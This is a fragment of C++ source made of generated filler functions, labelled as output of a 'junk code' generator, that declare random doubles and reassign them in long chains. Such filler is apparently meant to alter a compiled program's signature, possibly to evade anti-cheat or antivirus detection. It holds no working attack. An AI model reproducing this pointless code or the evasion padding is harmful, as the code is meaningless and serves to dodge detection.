WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma78858358 = -284569666;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma22797672 = -200171894;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma2062615 = -934593886;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma92970221 = -705993650;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma29159893 = -93621169;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma96072932 = -38086615;    double WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma23596364 = -292794435;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma16429667 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma84635514;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma84635514 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma69082890;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma69082890 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma8486037;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma8486037 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma61411694;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma61411694 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma82240372;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma82240372 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma80135354;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma80135354 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma91428434;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma91428434 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma21593470;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma21593470 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma7748303;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma7748303 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma82912981;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma82912981 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma79183897;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma79183897 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma4519614;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma4519614 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49199872;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49199872 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma998471;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma998471 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma63193975;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma63193975 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma59802048;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma59802048 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma84463494;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma84463494 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma73469946;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma73469946 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma83993282;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma83993282 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma75191820;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma75191820 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma38190105;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma38190105 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma97303585;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma97303585 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma19567674;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma19567674 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma8640290;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma8640290 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma10738057;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma10738057 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma54313346;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma54313346 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma46679927;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma46679927 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma48816685;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma48816685 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma68363007;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma68363007 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma68520424;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma68520424 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma39530209;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma39530209 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma94081154;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma94081154 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma38129214;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma38129214 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma91938317;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma91938317 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma20074534;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma20074534 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma4645667;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma4645667 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma4901968;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma4901968 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma29531995;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma29531995 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma50724698;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma50724698 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma35518042;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma35518042 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma35581971;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma35581971 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma82390355;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma82390355 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma35300811;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma35300811 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma66979136;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma66979136 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49394158;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49394158 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma90483431;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma90483431 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma25575946;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma25575946 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma81248695;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma81248695 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma1430680;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma1430680 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma85098459;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma85098459 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49503518;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49503518 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma52746810;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma52746810 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma18348728;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma18348728 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma25513956;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma25513956 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma78239562;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma78239562 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma87331928;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma87331928 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49515217;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma49515217 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma99845746;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma99845746 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma50673637;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma50673637 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma27927026;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma27927026 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma33455428;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma33455428 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma42611750;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma42611750 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma53230463;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma53230463 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma39227878;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma39227878 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma43382773;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma43382773 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma85102742;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma85102742 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma66390399;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma66390399 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma57261554;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma57261554 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma80923936;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma80923936 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma58548308;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma58548308 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma54900080;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma54900080 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma54931500;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma54931500 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma22745248;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma22745248 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma48475240;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma48475240 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma39609849;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma39609849 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma55799750;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma55799750 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma62002775;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma62002775 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma52588537;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma52588537 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma59246132;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma59246132 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma20254626;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma20254626 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma28737401;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma28737401 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma65431232;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma65431232 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma47386005;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma47386005 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma83264547;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma83264547 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma19016907;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma19016907 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma86783399;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma86783399 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma75732426;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma75732426 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma12615258;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma12615258 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma13698756;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma13698756 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma32742605;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma32742605 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma55130449;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma55130449 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma5056222;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma5056222 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma78858358;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma78858358 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma22797672;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma22797672 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma2062615;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma2062615 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma92970221;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma92970221 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma29159893;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma29159893 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma96072932;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma96072932 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma23596364;     WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma23596364 = WRrgQHxzibdQXKDvGBSXrilxSSOsrvKbRAma16429667;}
// Junk Finished

// Junk Code By Troll Face & Thaisen's Gen
void wXtNalVYXUGtBLsCWYbMQhoBrLrHeim68109281() {     double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp41729260 = -120995292;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp38878967 = -128779895;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp11097668 = 66650615;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp4932126 = 86790714;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp66153788 = -452490831;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp21219965 = -197982621;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp88162289 = 35087356;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp46659969 = -121545471;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp37973099 = -85238403;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp9986263 = -271758313;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp24094043 = -272892649;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp1786859 = -959045569;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp80017229 = -768542360;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp79857556 = -311689082;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp59114672 = -684975379;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp60054698 = -541852921;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp9339398 = -454133381;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp95354108 = -402319097;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp76826599 = -741356686;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp32488310 = -77436210;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp44171386 = -564635557;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp29134725 = -804647824;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp72595622 = -922017854;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp98495687 = -793171459;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp96959984 = -945517360;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp99150661 = -972602702;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp34785638 = -602539322;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp43114678 = -185338066;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp33535297 = -121250060;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp78060381 = 85954461;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp60710628 = -71363539;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp99757137 = -738577012;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp30134815 = -980195162;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp98432918 = -901418316;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp86824748 = -279622071;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp10222525 = -349210341;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp35083008 = -474020102;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp40589375 = 62866401;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp94148529 = -900818674;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp41687284 = -301620809;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp39406395 = -215619173;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp86437281 = -946113016;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp82640857 = -221941297;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp10035409 = -908796424;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp6935311 = -910575010;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp51561562 = -557623452;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp60786138 = -984166342;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp90001045 = -229521351;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp47691303 = 83574817;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp74745251 = -850364553;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp41660693 = -507920014;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp95304430 = -791242210;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp14998818 = 91366235;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp76242060 = -154206273;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp23937895 = -526781984;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp12594536 = -316347469;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp66283344 = -206762042;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp12601981 = -140177926;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp7972142 = 32308074;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp67003126 = -479888129;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp86434326 = -595443299;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp45047612 = -779574579;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp13124673 = 99704589;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp59912717 = -71192864;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp49275634 = -100394774;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp24336906 = -534315637;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp71652043 = -978850408;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp81584310 = -867124044;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp93032807 = 67932989;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp48892147 = -235765039;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp24971691 = 32167181;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp68750022 = -416999783;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp1205580 = -501500423;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp35139315 = -339735878;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp93081915 = -861817038;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp57734105 = -618522542;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp46493867 = -482706527;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp62560214 = 86778569;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp91560376 = -882596450;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp45398422 = -287893909;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp38364524 = -988436361;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp44784592 = -273017972;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp95423374 = -168912884;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp58790045 = -270885507;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp36399688 = -406125525;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp65406198 = -280121329;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp84758319 = -729943248;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp53892755 = -725988890;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp74495024 = -274636332;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp74230213 = -963274602;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp43939180 = -42448300;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp22481028 = -233842176;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp32617234 = -969441673;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp27145404 = -320930545;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp55252957 = -706177510;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp94358782 = -436044594;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp73312608 = -945817605;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp22728141 = -50748433;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp60759774 = -708401650;    double TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp82598405 = -120995292;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp41729260 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp38878967;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp38878967 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp11097668;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp11097668 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp4932126;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp4932126 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp66153788;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp66153788 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp21219965;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp21219965 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp88162289;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp88162289 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp46659969;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp46659969 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp37973099;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp37973099 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp9986263;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp9986263 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp24094043;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp24094043 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp1786859;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp1786859 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp80017229;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp80017229 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp79857556;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp79857556 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp59114672;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp59114672 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp60054698;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp60054698 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp9339398;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp9339398 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp95354108;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp95354108 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp76826599;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp76826599 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp32488310;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp32488310 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp44171386;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp44171386 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp29134725;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp29134725 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp72595622;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp72595622 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp98495687;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp98495687 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp96959984;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp96959984 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp99150661;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp99150661 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp34785638;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp34785638 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp43114678;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp43114678 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp33535297;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp33535297 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp78060381;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp78060381 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp60710628;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp60710628 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp99757137;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp99757137 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp30134815;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp30134815 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp98432918;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp98432918 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp86824748;     TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp86824748 = TElfAxrjSKUYlOpjqBXmRANmPisWOtOuohmp10222525;     